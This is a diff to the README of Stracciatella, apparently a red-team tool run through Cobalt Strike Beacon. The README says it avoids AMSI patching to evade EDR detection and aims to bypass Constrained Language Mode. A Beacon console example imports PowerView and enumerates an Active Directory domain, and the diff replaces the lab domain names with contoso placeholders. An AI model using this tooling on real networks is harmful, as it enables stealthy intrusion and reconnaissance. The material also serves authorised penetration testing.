@@ -150,25 +150,27 @@ Whereas:
 
 ## Cobalt Strike support
 
-Stracciatella comes with Aggressor script that when loaded exposes `stracciatella` command in the Beacon console. The usage is pretty much similar to `powerpick`. The input parameter will be xored with a random key. The advantage over `powerpick` is that the Stracciatella does not patch _AMSI.dll_ in the way like Powerpick does (_AmsiScanBuffer_ patch), thus potentially generating less forensic noise as seen by EDRs looking for in-memory patches. Also, Stracciatella will eventually be able to stabily bypass _Constrained Language Mode_ which is currently not possible using `powerpick`.:
+Stracciatella comes with Aggressor script that when loaded exposes `stracciatella` command in the Beacon console. The usage is pretty much similar to `powerpick` (with support for `powershell-import`ed scripts. The input parameter will be xored with a random key. The advantage over `powerpick` is that the Stracciatella does not patch _AMSI.dll_ in the way like Powerpick does (_AmsiScanBuffer_ patch), thus potentially generating less forensic noise as seen by EDRs looking for in-memory patches. Also, Stracciatella will eventually be able to stabily bypass _Constrained Language Mode_ which is currently not possible using `powerpick`.:
 
 ```
 beacon> powershell-import PowerView.ps1
 [+] host called home, sent: 143784 bytes
+
 beacon> stracciatella Get-Domain
-[*] Tasked beacon to run .NET program: stracciatella.exe -x 113 -e -c "VQRMWVYZBQUBS15eQENGX0FfQV9AS0RIRUhAXlYNVApZOCM8UVUuWAxYSldZNTgjUTAdGBACS144WylYWVUEWEpRSjYUBVw1HhwQGB8="
+[*] Tasked Beacon to run Stracciatella: Get-Domain
 [+] host called home, sent: 264483 bytes
 [+] received output:
-Forest                  : moneycorp.local
-DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}
-Children                : {us.dollarcorp.moneycorp.local}
+
+Forest                  : contoso.local
+DomainControllers       : {dc.contoso.local}
+Children                : {us.eu.contoso.local}
 DomainMode              : Unknown
 DomainModeLevel         : 7
-Parent                  : moneycorp.local
-PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
-RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
-InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local
-Name                    : dollarcorp.moneycorp.local
+Parent                  : contoso.local
+PdcRoleOwner            : dc.eu.contoso.local
+RidRoleOwner            : dc.eu.contoso.local
+InfrastructureRoleOwner : dc.eu.contoso.local
+Name                    : eu.contoso.local
 
 ```
 
